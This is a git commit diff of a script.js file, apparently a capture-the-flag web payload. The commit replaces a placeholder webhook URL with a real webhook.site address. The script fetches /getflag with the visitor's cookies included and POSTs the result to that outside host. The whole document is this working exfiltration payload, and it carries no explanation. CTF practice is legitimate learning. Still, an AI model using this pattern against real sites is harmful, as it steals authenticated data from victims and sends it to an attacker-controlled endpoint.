165e9946f800dbe7a5bfe46bfc8366e2550c59d9
iris-chieh <146847095+iris-chieh@users.noreply.github.com>
2025-04-19 09:34:35 +0800

    Update script.js

--- script.js
+++ script.js
@@ -1,7 +1,7 @@
 fetch("/getflag", { credentials: "include" })
   .then(r => r.text())
   .then(flag => {
-    fetch("https://webhook.site/你的ID", {
+    fetch("	https://webhook.site/9e9b0fae-1211-4d2f-b5f9-5cf25e9fa220", {
       method: "POST",
       mode: "no-cors",
       body: flag
